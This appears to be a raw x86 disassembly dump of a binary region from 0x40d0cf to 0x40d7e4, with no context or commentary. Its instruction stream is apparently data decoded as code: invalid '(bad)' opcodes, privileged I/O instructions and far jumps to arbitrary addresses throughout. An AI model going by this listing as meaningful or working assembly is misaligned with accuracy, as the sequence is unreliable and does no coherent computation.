  40d0cf:	xchg   edi,eax
  40d0d0:	mov    eax,ds:0x7e5e3d04
  40d0d5:	cmp    bh,BYTE PTR [edi-0x5e83f9b5]
  40d0db:	lahf   
  40d0dc:	std    
  40d0dd:	outs   dx,BYTE PTR ds:[esi]
  40d0de:	ja     0x40d0a9
  40d0e0:	loope  0x40d0a1
  40d0e2:	lock mov dl,0x2c
  40d0e5:	(bad)  
  40d0e6:	lock repnz or ecx,DWORD PTR [edi-0x56919dc9]
  40d0ee:	xor    ebx,DWORD PTR [edi]
  40d0f0:	cli    
  40d0f1:	fisttp WORD PTR [ebp-0x31cc3ce2]
  40d0f7:	int3   
  40d0f8:	dec    ebx
  40d0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0fb:	adc    al,0x7b
  40d0fd:	xor    BYTE PTR [ecx],ch
  40d0ff:	jns    0x40d0a4
  40d101:	nop
  40d102:	fstp   st(0)
  40d104:	sub    al,0xdf
  40d106:	addr16 xchg edi,eax
  40d108:	aas    
  40d109:	jge    0x40d0a6
  40d10b:	hlt    
  40d10c:	pop    es
  40d10d:	call   0xb714:0x7b74510
  40d114:	bound  esp,QWORD PTR [eax]
  40d116:	or     BYTE PTR [ecx-0x11],bl
  40d119:	push   ds
  40d11a:	xor    al,0xfe
  40d11c:	fmul   st,st(5)
  40d11e:	iret   
  40d11f:	getsec 
  40d121:	stos   DWORD PTR es:[edi],eax
  40d122:	repnz popa 
  40d124:	mov    ecx,0xbc57d08e
  40d129:	test   esi,ebp
  40d12b:	call   0x545a:0xe3fa1632
  40d132:	push   edi
  40d133:	iret   
  40d134:	sub    eax,0x9e86e0d3
  40d139:	mov    edi,0x2531927c
  40d13e:	xchg   ecx,eax
  40d13f:	add    al,0xd
  40d141:	popf   
  40d142:	das    
  40d143:	call   0xb40:0x7f665599
  40d14a:	pop    esp
  40d14c:	push   esp
  40d14d:	mov    ebx,0x54e56ad6
  40d152:	mov    edx,0xa64737aa
  40d157:	fistp  DWORD PTR [esi+0x2166a2e]
  40d15d:	call   0xc125:0xcf93fc75
  40d164:	bswap  esp
  40d166:	std    
  40d167:	je     0x40d1aa
  40d169:	jno    0x40d1e6
  40d16b:	imul   esp,DWORD PTR [eax],0x13d51506
  40d171:	call   0xe896:0xf188c5b3
  40d178:	inc    ecx
  40d179:	lods   eax,DWORD PTR ds:[esi]
  40d17a:	dec    DWORD PTR [ecx-0x5061263d]
  40d180:	das    
  40d181:	sub    eax,DWORD PTR [edi+edi*4-0x46]
  40d185:	in     al,dx
  40d186:	push   eax
  40d187:	mov    edi,0x32c52c61
  40d18c:	int3   
  40d18d:	jno    0x40d19e
  40d18f:	aas    
  40d190:	aas    
  40d191:	lock call 0x6686ebf1
  40d197:	xor    DWORD PTR [ebx],eax
  40d199:	push   eax
  40d19a:	mov    cs,WORD PTR [edx+0x19]
  40d19d:	loop   0x40d153
  40d19f:	sub    BYTE PTR [ecx+0x5989f8ef],bl
  40d1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1a6:	xchg   BYTE PTR [esi-0x43],dl
  40d1a9:	sub    bl,BYTE PTR [ecx+0x29b28e91]
  40d1af:	mov    al,BYTE PTR [edx]
  40d1b1:	xor    eax,0xe50b8b57
  40d1b6:	dec    ecx
  40d1b7:	pushf  
  40d1b8:	inc    ecx
  40d1b9:	cmp    al,0x39
  40d1bb:	xchg   ecx,eax
  40d1bc:	js     0x40d20f
  40d1be:	mov    edx,0x3921eced
  40d1c3:	push   ss
  40d1c4:	call   0x1282:0xbba166fa
  40d1cb:	test   DWORD PTR [edi],0x51e68394
  40d1d1:	lahf   
  40d1d2:	sti    
  40d1d3:	push   ss
  40d1d4:	stos   DWORD PTR es:[edi],eax
  40d1d5:	xor    dl,BYTE PTR [esi+0x3a]
  40d1d8:	outs   dx,BYTE PTR ds:[esi]
  40d1d9:	and    DWORD PTR ss:[eax+0x31],0x75
  40d1de:	addr16 inc ebx
  40d1e0:	fadd   st(5),st
  40d1e2:	xchg   esi,eax
  40d1e3:	mov    ah,0x94
  40d1e5:	ret    0x702c
  40d1e8:	mov    esi,0xe3826a7e
  40d1ed:	xchg   ecx,eax
  40d1ee:	pop    ebx
  40d1ef:	and    bl,BYTE PTR [esi-0x1eb8aaea]
  40d1f5:	ds daa 
  40d1f7:	fwait
  40d1f8:	and    DWORD PTR [edx-0x27],0x61
  40d1fc:	out    dx,al
  40d1fd:	push   ebx
  40d1fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1ff:	xchg   ecx,eax
  40d200:	pop    edx
  40d201:	cdq    
  40d202:	push   edi
  40d203:	push   cs
  40d204:	or     DWORD PTR [ebp-0x72e4c378],ebp
  40d20a:	scas   eax,DWORD PTR es:[edi]
  40d20b:	add    eax,0xdf97881c
  40d210:	xor    ebp,DWORD PTR [edx+ecx*1]
  40d213:	dec    edx
  40d214:	xor    bl,BYTE PTR [eax+ebx*4-0x6]
  40d218:	out    0xe,eax
  40d21a:	push   edi
  40d21b:	add    bh,bh
  40d21d:	repz and bl,BYTE PTR [ecx]
  40d220:	sbb    DWORD PTR [eax+0x24],esi
  40d223:	adc    DWORD PTR [edx],ecx
  40d225:	clc    
  40d226:	inc    eax
  40d227:	mov    eax,ds:0x563e50d8
  40d22c:	(bad)  [edi+0x26]
  40d22f:	jno    0x40d2ad
  40d231:	xchg   edi,eax
  40d232:	dec    ebx
  40d233:	nop
  40d234:	fabs   
  40d236:	dec    esi
  40d237:	sub    al,0x54
  40d239:	sar    BYTE PTR [edx+0x3f],1
  40d23c:	ja     0x40d1c7
  40d23e:	je     0x40d23b
  40d240:	jp     0x40d26c
  40d242:	inc    ebx
  40d243:	xor    BYTE PTR [eax+0x34],0x3c
  40d247:	loop   0x40d263
  40d249:	and    bh,BYTE PTR [edi]
  40d24b:	push   ebp
  40d24c:	push   esi
  40d24d:	in     eax,0x2f
  40d24f:	fiadd  DWORD PTR [esi+edx*4-0x4d9e6693]
  40d256:	stos   BYTE PTR es:[edi],al
  40d257:	dec    ebx
  40d258:	sahf   
  40d259:	aam    0x66
  40d25b:	mov    ch,0x5a
  40d25d:	sar    DWORD PTR [esi-0x15],1
  40d260:	cmp    bl,BYTE PTR [ebx+0x3d]
  40d263:	add    esp,edi
  40d265:	jg     0x40d225
  40d267:	mov    edi,0x80d1c7b2
  40d26c:	gs jp  0x40d2ed
  40d26f:	cmp    eax,0x7726fbb
  40d274:	cdq    
  40d275:	push   0x14
  40d277:	sbb    DWORD PTR [ebx-0x1f],0x5b0f704d
  40d27e:	mov    esi,0xd1b13ecc
  40d283:	outs   dx,BYTE PTR ds:[esi]
  40d284:	rcl    BYTE PTR [esi+0x2bc8c3ab],0x6d
  40d28b:	jp     0x40d25c
  40d28d:	cmp    ch,cl
  40d28f:	and    DWORD PTR [esi+0x2],ecx
  40d292:	(bad)  
  40d293:	arpl   WORD PTR [eax+0x36],dx
  40d296:	loope  0x40d24b
  40d298:	add    DWORD PTR [esi-0x3],esi
  40d29b:	fstp   QWORD PTR [edi+0x21]
  40d29e:	push   esp
  40d29f:	mov    bh,0x36
  40d2a1:	loope  0x40d2eb
  40d2a3:	hlt    
  40d2a4:	(bad)  
  40d2a5:	jge    0x40d2f3
  40d2a7:	sbb    BYTE PTR ds:0x2aa459d6,0xaf
  40d2ae:	sbb    DWORD PTR [ecx+0xfdd5e34],0xffffff83
  40d2b5:	jg     0x40d335
  40d2b7:	fwait
  40d2b8:	jne    0x40d31f
  40d2ba:	mov    ebp,DWORD PTR [edi+0x3b1692e5]
  40d2c0:	push   edx
  40d2c1:	cwde   
  40d2c2:	inc    eax
  40d2c3:	popa   
  40d2c4:	pop    ebx
  40d2c5:	add    ebp,DWORD PTR [ebp+0x14]
  40d2c8:	sbb    DWORD PTR [ecx+0x6],ebp
  40d2cb:	popf   
  40d2cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2cd:	and    ebx,DWORD PTR [edx]
  40d2cf:	jno    0x40d28c
  40d2d1:	inc    edx
  40d2d2:	or     DWORD PTR fs:[ecx-0x17],0xffffffb7
  40d2d7:	jmp    0xba428ab
  40d2dc:	pop    edx
  40d2dd:	mov    DWORD PTR [edi],ebx
  40d2df:	dec    ebp
  40d2e0:	mov    esp,DWORD PTR [esp]
  40d2e3:	pop    ebx
  40d2e4:	push   0x26
  40d2e6:	popf   
  40d2e7:	fnstenv [eax]
  40d2e9:	pusha  
  40d2ea:	(bad)  
  40d2eb:	retf   
  40d2ec:	mov    bh,0x7f
  40d2ee:	mul    BYTE PTR [esi-0x1b]
  40d2f1:	sbb    al,0xc9
  40d2f3:	pop    ss
  40d2f4:	sub    DWORD PTR [edx+0x2528a63c],edx
  40d2fa:	idiv   BYTE PTR [eax]
  40d2fc:	(bad)  
  40d2fe:	(bad)  
  40d300:	xlat   BYTE PTR ds:[ebx]
  40d301:	xlat   BYTE PTR ds:[ebx]
  40d302:	xchg   edx,eax
  40d303:	sub    esp,0xffffffba
  40d306:	xchg   edx,eax
  40d307:	xchg   edi,eax
  40d308:	in     eax,dx
  40d309:	fadd   st,st(6)
  40d30b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d30c:	cmp    DWORD PTR [eax+ebx*1-0x10b357fb],edi
  40d313:	mov    ch,0xfa
  40d315:	jle    0x40d37b
  40d317:	int    0xe7
  40d319:	fcom   DWORD PTR [ecx]
  40d31b:	shr    BYTE PTR [edx+0x3235dbd],1
  40d321:	fwait
  40d322:	xor    DWORD PTR [edi],esp
  40d324:	add    ecx,DWORD PTR [ecx]
  40d326:	mov    cl,BYTE PTR [ecx-0x28d36c30]
  40d32c:	inc    eax
  40d32d:	mov    ebp,0xa550e87c
  40d332:	call   0x1b975feb
  40d337:	loop   0x40d38b
  40d339:	xor    dl,ah
  40d33b:	or     BYTE PTR [edi-0x1b],0xe0
  40d33f:	xor    ecx,DWORD PTR [edi-0x53]
  40d342:	adc    BYTE PTR [esi-0x6d],dh
  40d345:	cmp    eax,0x821e2257
  40d34a:	repz pop edi
  40d34c:	sub    eax,0x5bbdb434
  40d351:	lock mov cl,0xc5
  40d354:	fiadd  WORD PTR [esp+ebp*4]
  40d357:	leave  
  40d358:	mov    ecx,0xb84f4364
  40d35d:	sub    BYTE PTR [edi],0x25
  40d360:	js     0x40d35d
  40d362:	rcl    BYTE PTR gs:[ebx],1
  40d365:	enter  0x6346,0xf
  40d369:	sub    eax,0xd3db4907
  40d36e:	or     DWORD PTR [ebp+0x77],edi
  40d371:	jmp    0x8d841cce
  40d376:	mov    ch,0xeb
  40d378:	push   esi
  40d379:	outs   dx,BYTE PTR ds:[esi]
  40d37a:	add    cl,al
  40d37c:	mov    eax,ds:0xc0b17714
  40d381:	out    dx,eax
  40d382:	sbb    BYTE PTR [esi],ch
  40d384:	clc    
  40d385:	into   
  40d386:	sub    esp,DWORD PTR [esi+ebx*2]
  40d389:	call   0x2140591e
  40d38e:	out    0x31,al
  40d390:	mov    ebx,0x5ac81a5a
  40d395:	sbb    al,0x65
  40d397:	lds    ebp,FWORD PTR [edx+edi*8-0x7d16c074]
  40d39e:	inc    edx
  40d39f:	inc    eax
  40d3a0:	call   DWORD PTR [ecx]
  40d3a2:	rol    BYTE PTR [esi-0x45c6ed2f],1
  40d3a8:	dec    edx
  40d3a9:	cwde   
  40d3aa:	js     0x40d35d
  40d3ac:	xor    cl,BYTE PTR [eax-0x59]
  40d3af:	sbb    edx,esp
  40d3b1:	cmp    edi,edx
  40d3b3:	sahf   
  40d3b4:	in     al,dx
  40d3b5:	push   ebx
  40d3b6:	pop    ebp
  40d3b7:	call   0x21fd17a0
  40d3bc:	xchg   ebp,eax
  40d3bd:	(bad)  
  40d3be:	aad    0x7d
  40d3c0:	outs   dx,BYTE PTR ds:[esi]
  40d3c1:	lock cmp al,0xc
  40d3c4:	push   ss
  40d3c5:	sar    DWORD PTR [ecx+0x4ba37b72],0xa1
  40d3cc:	(bad)  
  40d3cd:	mov    ch,0x99
  40d3cf:	repnz das 
  40d3d1:	pop    ebx
  40d3d2:	add    bl,BYTE PTR [ebx+0x50]
  40d3d5:	push   edi
  40d3d6:	fisub  WORD PTR [eax]
  40d3d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d3d9:	loop   0x40d3cf
  40d3db:	cmc    
  40d3dc:	add    ecx,eax
  40d3de:	add    edx,0xa4c31c30
  40d3e4:	mov    esp,0xe34ca662
  40d3e9:	jo     0x40d392
  40d3eb:	jle    0x40d459
  40d3ed:	pusha  
  40d3ee:	icebp  
  40d3ef:	lea    edx,ds:0xf116e7db
  40d3f5:	fmulp  st(0),st
  40d3f7:	stos   BYTE PTR es:[edi],al
  40d3f8:	lds    ecx,FWORD PTR [edx+0x15]
  40d3fb:	aad    0x90
  40d3fd:	fisttp DWORD PTR [edi+0x73]
  40d400:	in     eax,dx
  40d401:	js     0x40d3db
  40d403:	inc    esi
  40d404:	xchg   esi,eax
  40d405:	lahf   
  40d406:	jnp    0x40d486
  40d408:	nop
  40d409:	sbb    eax,0x9707b1dc
  40d40e:	(bad)  
  40d410:	fwait
  40d411:	out    dx,eax
  40d412:	dec    ecx
  40d413:	add    bh,BYTE PTR [ebp+0x26]
  40d416:	sbb    ah,al
  40d418:	cld    
  40d419:	add    al,0x87
  40d41b:	and    eax,0xf248d083
  40d420:	lahf   
  40d421:	jnp    0x40d46c
  40d423:	sbb    DWORD PTR [esp+ecx*8],0x47b4f6d6
  40d42a:	sub    DWORD PTR [ebp+eax*2-0x2e939161],edi
  40d431:	retf   0xb8e3
  40d434:	imul   eax,DWORD PTR [eax+0x69b4bc5d],0x7aa49381
  40d43e:	inc    edi
  40d43f:	shr    BYTE PTR [esi],1
  40d441:	fs pop esi
  40d443:	dec    edi
  40d444:	(bad)  [eax-0x487836cb]
  40d44a:	xlat   BYTE PTR ds:[ebx]
  40d44b:	pop    eax
  40d44c:	add    eax,0x4ab9bf95
  40d451:	xor    BYTE PTR [ebp+0x78],al
  40d454:	mov    bh,0xf8
  40d456:	fisttp WORD PTR [eax-0x51]
  40d459:	push   ds
  40d45a:	stos   DWORD PTR es:[edi],eax
  40d45b:	mov    al,ds:0x6c49bb10
  40d460:	lahf   
  40d461:	(bad)  
  40d462:	mov    al,ds:0x57aeeabc
  40d467:	pop    ebp
  40d468:	jmp    0x83120317
  40d46d:	xchg   cl,bh
  40d46f:	push   0x39
  40d471:	inc    edx
  40d472:	cmp    eax,0x6720e798
  40d477:	mov    esp,0xb771803c
  40d47c:	dec    ecx
  40d47d:	sbb    DWORD PTR [esi+0x59210a33],0xf8d3d465
  40d487:	push   edi
  40d488:	dec    edi
  40d489:	cwde   
  40d48a:	jge    0x40d4ff
  40d48c:	lods   eax,DWORD PTR ds:[esi]
  40d48d:	add    DWORD PTR [ebp-0x4ab699f9],ebp
  40d493:	jno    0x40d4a0
  40d495:	dec    ebp
  40d496:	sbb    ebx,DWORD PTR ss:[edi-0x28]
  40d49a:	dec    edi
  40d49b:	inc    esi
  40d49c:	fldcw  WORD PTR [ebp+0x69]
  40d49f:	fs (bad) 
  40d4a1:	shl    bh,cl
  40d4a3:	push   0xffffffb0
  40d4a5:	inc    esp
  40d4a6:	jae    0x40d434
  40d4a8:	inc    edx
  40d4a9:	pop    es
  40d4aa:	mov    DWORD PTR [eax],ecx
  40d4ac:	jne    0x40d4af
  40d4ae:	sti    
  40d4af:	cmc    
  40d4b0:	hlt    
  40d4b1:	jae    0x40d511
  40d4b3:	lds    eax,FWORD PTR [ebx]
  40d4b5:	or     BYTE PTR [edi+0x5af12f9],0x1e
  40d4bc:	add    eax,ebx
  40d4be:	adc    ebx,ecx
  40d4c0:	je     0x40d4e2
  40d4c2:	or     dl,ch
  40d4c4:	mov    eax,ds:0x3e0a658c
  40d4c9:	xchg   DWORD PTR [ebp-0x6c],ecx
  40d4cc:	sub    esi,DWORD PTR [edi]
  40d4ce:	mov    eax,0x61709dd7
  40d4d3:	rcl    DWORD PTR [esi-0x2b],0x1f
  40d4d7:	xor    BYTE PTR [ebx],al
  40d4d9:	dec    eax
  40d4da:	scas   eax,DWORD PTR es:[edi]
  40d4db:	out    0x58,al
  40d4dd:	arpl   WORD PTR [ebp+0x67e05b70],si
  40d4e3:	lods   eax,DWORD PTR ds:[esi]
  40d4e4:	test   al,0x5c
  40d4e6:	fisttp WORD PTR [ecx]
  40d4e8:	sbb    DWORD PTR [ecx],edx
  40d4ea:	cli    
  40d4eb:	loop   0x40d528
  40d4ed:	dec    ax
  40d4ef:	loop   0x40d50d
  40d4f1:	pop    ss
  40d4f2:	out    0x35,eax
  40d4f4:	sub    dh,BYTE PTR [edx-0x19]
  40d4f7:	adc    al,0x37
  40d4f9:	fwait
  40d4fa:	aad    0xd9
  40d4fc:	hlt    
  40d4fd:	push   cs
  40d4fe:	outs   dx,DWORD PTR ds:[esi]
  40d4ff:	sbb    al,0xbf
  40d501:	mov    al,ds:0xce87c2d5
  40d506:	pusha  
  40d507:	in     al,0xc3
  40d509:	inc    ebp
  40d50a:	add    eax,0xc51a9ed5
  40d50f:	sub    BYTE PTR [eax-0x4e],cl
  40d512:	fnstcw WORD PTR [ecx+0x3a]
  40d515:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d516:	jge    0x40d4ed
  40d518:	or     al,0x4e
  40d51a:	aad    0xba
  40d51c:	push   ebx
  40d51d:	in     eax,dx
  40d51e:	sbb    eax,0x1a4bafb3
  40d523:	sbb    esp,esp
  40d525:	stos   BYTE PTR es:[edi],al
  40d526:	int    0x79
  40d528:	sub    al,0x97
  40d52a:	lods   eax,DWORD PTR ds:[esi]
  40d52b:	mov    cl,0x5d
  40d52d:	add    edx,DWORD PTR [esi+0x53557498]
  40d533:	shr    bh,cl
  40d535:	scas   al,BYTE PTR es:[edi]
  40d536:	push   0xbe25019d
  40d53b:	enter  0xf8f1,0x7e
  40d53f:	and    eax,0xc5d2fda2
  40d544:	push   cs
  40d545:	inc    ebx
  40d546:	dec    esp
  40d547:	(bad)  
  40d548:	and    eax,0xf7da2ac9
  40d54d:	std    
  40d54e:	adc    al,0xfd
  40d550:	mov    eax,0x1d9c01c3
  40d555:	(bad)  
  40d556:	into   
  40d557:	ins    BYTE PTR es:[edi],dx
  40d558:	sahf   
  40d559:	fild   DWORD PTR [edx+ecx*4]
  40d55c:	shl    DWORD PTR [ebp-0x1c],0x5d
  40d560:	dec    esi
  40d561:	mov    ecx,eax
  40d563:	sub    DWORD PTR ds:0xd9554776,edi
  40d569:	inc    eax
  40d56a:	ss stos BYTE PTR es:[edi],al
  40d56c:	ret    0x626c
  40d56f:	pop    eax
  40d570:	or     BYTE PTR cs:[ecx-0x5b],0x1d
  40d575:	mov    esp,0x60d50a90
  40d57a:	xchg   esi,eax
  40d57b:	arpl   WORD PTR [esi],sp
  40d57d:	rcl    DWORD PTR [esi],1
  40d57f:	mov    ch,0x4a
  40d581:	test   DWORD PTR [ecx-0x6b],eax
  40d584:	pop    ss
  40d585:	div    DWORD PTR ds:0x1770fd33
  40d58b:	dec    eax
  40d58c:	jnp    0x40d58c
  40d58e:	xchg   DWORD PTR ds:0x70c052b0,edx
  40d594:	mov    esp,0xccc88f51
  40d599:	aad    0xeb
  40d59b:	jnp    0x40d5e5
  40d59d:	xchg   edi,eax
  40d59e:	mov    eax,DWORD PTR [ebp+0x56]
  40d5a1:	loope  0x40d5ac
  40d5a3:	or     dl,ah
  40d5a5:	and    BYTE PTR [ebp+esi*4+0x77da2e56],ch
  40d5ac:	popf   
  40d5ad:	add    ebp,DWORD PTR [ebp-0x76a44f1f]
  40d5b3:	inc    esp
  40d5b4:	(bad)  
  40d5b5:	push   edi
  40d5b6:	out    dx,al
  40d5b7:	xor    eax,0x8e6a235b
  40d5bc:	repnz push ebp
  40d5be:	scas   eax,DWORD PTR es:[edi]
  40d5bf:	inc    edx
  40d5c0:	pop    edx
  40d5c1:	ss xchg ebp,eax
  40d5c3:	popa   
  40d5c4:	add    al,0x1c
  40d5c6:	int    0x2d
  40d5c8:	lods   al,BYTE PTR ds:[esi]
  40d5c9:	aaa    
  40d5ca:	and    BYTE PTR ds:0x6290673e,0xee
  40d5d1:	lock ds data16 into 
  40d5d5:	sub    al,0xc
  40d5d7:	in     eax,dx
  40d5d8:	ficom  DWORD PTR [edx+0x32]
  40d5db:	xor    BYTE PTR [ecx+0x18],bh
  40d5de:	ins    DWORD PTR es:[edi],dx
  40d5df:	cmp    esi,DWORD PTR [ebx+0x67]
  40d5e2:	inc    ebp
  40d5e3:	aam    0x9e
  40d5e5:	mov    BYTE PTR [esi],0x67
  40d5e8:	inc    edx
  40d5e9:	(bad)  
  40d5ea:	dec    edi
  40d5eb:	std    
  40d5ec:	retf   
  40d5ed:	push   ss
  40d5ee:	push   ebp
  40d5ef:	and    edx,DWORD PTR [edi+0x5]
  40d5f2:	cmp    BYTE PTR [esi-0x6d],bh
  40d5f5:	jns    0x40d655
  40d5f7:	icebp  
  40d5f8:	adc    edi,DWORD PTR [eax-0x74]
  40d5fb:	pop    ss
  40d5fc:	or     DWORD PTR [ebp-0x62],esi
  40d5ff:	mov    dh,0xd5
  40d601:	inc    esp
  40d602:	stos   DWORD PTR es:[edi],eax
  40d603:	ins    DWORD PTR es:[edi],dx
  40d604:	sub    edi,DWORD PTR [si]
  40d607:	pop    esi
  40d608:	stc    
  40d609:	repnz xor BYTE PTR [eax+0x79131a00],al
  40d610:	dec    esp
  40d611:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d612:	sbb    BYTE PTR [eax+0x237b8dda],cl
  40d618:	out    dx,al
  40d619:	jns    0x40d61d
  40d61b:	cld    
  40d61c:	jge    0x40d678
  40d61e:	xchg   ebp,eax
  40d61f:	gs push esi
  40d621:	jnp    0x40d61c
  40d623:	inc    eax
  40d624:	int    0x84
  40d626:	cmp    al,BYTE PTR [ecx]
  40d628:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d629:	add    al,BYTE PTR [edx]
  40d62b:	pop    ss
  40d62c:	(bad)  
  40d62d:	or     BYTE PTR [edx+ebx*8-0x7a],al
  40d631:	out    dx,al
  40d632:	loope  0x40d63a
  40d634:	and    al,BYTE PTR [ecx+0x63]
  40d637:	xor    cl,BYTE PTR [edi+0x59]
  40d63a:	ret    
  40d63b:	iret   
  40d63c:	bound  esi,QWORD PTR [edx-0x33e84c5d]
  40d642:	scas   al,BYTE PTR es:[edi]
  40d643:	sbb    cl,BYTE PTR [edi]
  40d645:	seta   BYTE PTR [edx+ebx*4]
  40d649:	jnp    0x40d688
  40d64b:	add    bl,dh
  40d64d:	add    ecx,edi
  40d64f:	out    dx,al
  40d650:	and    DWORD PTR fs:[eax],edi
  40d653:	xchg   edx,eax
  40d654:	jg     0x40d636
  40d656:	ret    
  40d657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d658:	mov    ch,0x57
  40d65a:	pop    ebx
  40d65b:	div    BYTE PTR [edx-0x6120ef94]
  40d661:	xor    dl,BYTE PTR [edx+0x2fe1dcdf]
  40d667:	dec    ebx
  40d668:	scas   al,BYTE PTR es:[edi]
  40d669:	ja     0x40d69f
  40d66b:	retf   
  40d66c:	shr    BYTE PTR [esi+0x6c],cl
  40d66f:	les    esi,FWORD PTR [esi-0x7d]
  40d672:	push   ds
  40d673:	mov    ds:0x73963540,al
  40d678:	jne    0x40d6df
  40d67a:	jae    0x40d660
  40d67c:	xchg   DWORD PTR [ecx],esp
  40d67e:	push   0x6b
  40d680:	jmp    0xee07b305
  40d685:	dec    ecx
  40d686:	adc    DWORD PTR [edx+0x4b],esi
  40d689:	cmp    DWORD PTR [ebp-0x29],edi
  40d68c:	sbb    eax,0x5fce2dcc
  40d691:	pop    eax
  40d692:	or     eax,0x69963865
  40d697:	cmc    
  40d698:	cmc    
  40d699:	push   es
  40d69a:	adc    cl,al
  40d69c:	adc    bh,bh
  40d69e:	(bad)  
  40d69f:	int3   
  40d6a0:	jmp    0x3e3b:0xb763b383
  40d6a7:	stos   BYTE PTR es:[edi],al
  40d6a8:	out    dx,al
  40d6a9:	mov    dl,0xd8
  40d6ab:	sbb    ch,dh
  40d6ad:	popf   
  40d6ae:	xchg   esi,eax
  40d6af:	es push 0x5e0cf8a1
  40d6b5:	call   0x4cf7ecbe
  40d6ba:	out    0xc,eax
  40d6bc:	push   ecx
  40d6bd:	cmc    
  40d6be:	mov    bl,0x36
  40d6c0:	loop   0x40d688
  40d6c2:	sub    BYTE PTR [ecx],bh
  40d6c4:	or     BYTE PTR [edi-0x14],0x1
  40d6c8:	scas   eax,DWORD PTR es:[edi]
  40d6c9:	pop    ebx
  40d6ca:	adc    dh,bl
  40d6cc:	xchg   esi,eax
  40d6cd:	sub    DWORD PTR [edx-0x3e],edx
  40d6d0:	pop    es
  40d6d1:	mov    bl,0x82
  40d6d3:	data16 stc 
  40d6d5:	lahf   
  40d6d6:	ins    BYTE PTR es:[edi],dx
  40d6d7:	and    al,0x35
  40d6d9:	xchg   edx,eax
  40d6da:	pop    ecx
  40d6db:	pushf  
  40d6dc:	cdq    
  40d6dd:	sahf   
  40d6de:	sub    eax,0x2618d84c
  40d6e3:	stc    
  40d6e4:	mov    bh,0x6d
  40d6e6:	or     DWORD PTR [edi],ebx
  40d6e8:	mov    ch,0x53
  40d6ea:	test   al,0x39
  40d6ec:	mov    dl,BYTE PTR [edi-0x20]
  40d6ef:	inc    esp
  40d6f0:	push   edi
  40d6f1:	push   ss
  40d6f2:	rcr    DWORD PTR [edx],0xe1
  40d6f5:	fild   WORD PTR [ecx+0x7b]
  40d6f8:	sbb    ch,dh
  40d6fa:	and    al,0x84
  40d6fc:	push   es
  40d6fd:	xor    BYTE PTR [ecx+0x2a27eb2e],bh
  40d703:	pop    ebx
  40d704:	(bad)  
  40d705:	in     al,dx
  40d706:	fldl2e 
  40d708:	jae    0x40d6ee
  40d70a:	jmp    0xc50a:0xdd1c8934
  40d711:	xchg   esi,edi
  40d713:	fld    TBYTE PTR [ebx+0x4a]
  40d716:	sub    DWORD PTR [ebx-0x46c139c],esp
  40d71c:	scas   al,BYTE PTR es:[edi]
  40d71d:	xchg   esi,ebp
  40d71f:	mov    bl,0x5b
  40d721:	clc    
  40d722:	sub    al,0xa9
  40d724:	or     eax,0x96afebb9
  40d729:	sub    al,0x6b
  40d72b:	pop    edi
  40d72c:	ins    DWORD PTR es:[edi],dx
  40d72d:	lods   al,BYTE PTR ds:[esi]
  40d72e:	ror    esp,cl
  40d730:	fmul   st(4),st
  40d732:	jbe    0x40d735
  40d734:	sbb    BYTE PTR [ebx-0x22],al
  40d737:	mov    WORD PTR [ecx],gs
  40d739:	mov    ecx,0x9f14bda4
  40d73e:	add    BYTE PTR [ecx-0x3a],0x3c
  40d742:	xchg   esi,eax
  40d743:	in     eax,0xb0
  40d745:	int    0x86
  40d747:	clc    
  40d748:	test   bh,0x6b
  40d74b:	and    al,0x20
  40d74d:	cmp    BYTE PTR [ebp-0x3fed15af],dl
  40d753:	lods   al,BYTE PTR ds:[esi]
  40d754:	inc    esp
  40d755:	jnp    0x40d6da
  40d757:	xor    DWORD PTR [ecx],eax
  40d759:	xchg   ecx,eax
  40d75a:	jbe    0x40d6df
  40d75c:	fimul  WORD PTR [ebx+edi*8+0x71d27743]
  40d763:	cwde   
  40d764:	(bad)  
  40d765:	xchg   ebx,eax
  40d766:	and    eax,0x299376e2
  40d76b:	sub    BYTE PTR [ebx],bh
  40d76d:	out    0xc8,al
  40d76f:	mov    ds:0x27f5a54e,eax
  40d774:	fild   WORD PTR [eax+0x34]
  40d777:	xor    DWORD PTR [ecx],ecx
  40d779:	iret   
  40d77a:	test   DWORD PTR [esi],edx
  40d77c:	dec    ebp
  40d77d:	jne    0x40d727
  40d77f:	mov    WORD PTR [eax+0x46],fs
  40d782:	push   ecx
  40d783:	les    edi,FWORD PTR [ebx-0x1d]
  40d786:	mov    esi,0xba093626
  40d78b:	dec    edi
  40d78c:	xchg   edi,eax
  40d78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d78e:	out    dx,eax
  40d78f:	mov    al,ds:0x13bee186
  40d794:	(bad)  
  40d795:	out    dx,al
  40d796:	push   ds
  40d797:	daa    
  40d798:	(bad)  
  40d799:	outs   dx,BYTE PTR ds:[esi]
  40d79a:	sbb    DWORD PTR [esi+0x49532aa7],ebp
  40d7a0:	mov    eax,ds:0x7227059c
  40d7a5:	daa    
  40d7a6:	jl     0x40d799
  40d7a8:	jb     0x40d783
  40d7aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ab:	inc    ebx
  40d7ac:	jbe    0x40d74c
  40d7ae:	lea    ebx,ds:0x8ba3c306
  40d7b4:	in     al,0xc9
  40d7b6:	mov    ?,ebp
  40d7b8:	adc    eax,0x79086acf
  40d7bd:	and    edi,DWORD PTR [edi-0x62622d42]
  40d7c3:	jle    0x40d74d
  40d7c5:	cmp    ebx,edi
  40d7c7:	les    esp,FWORD PTR ds:[edi]
  40d7ca:	cmp    al,0x3
  40d7cc:	ins    DWORD PTR es:[edi],dx
  40d7cd:	idiv   ebx
  40d7cf:	cmp    cl,BYTE PTR [edx]
  40d7d1:	loope  0x40d844
  40d7d3:	pushf  
  40d7d4:	daa    
  40d7d5:	and    BYTE PTR ds:0x18b471c,cl
  40d7dc:	sub    al,0x45
  40d7de:	push   ebx
  40d7df:	push   ebp
  40d7e0:	sbb    dh,BYTE PTR [ebx+0xe]
  40d7e3:	pop    ebp
  40d7e4:	or     al,0xae
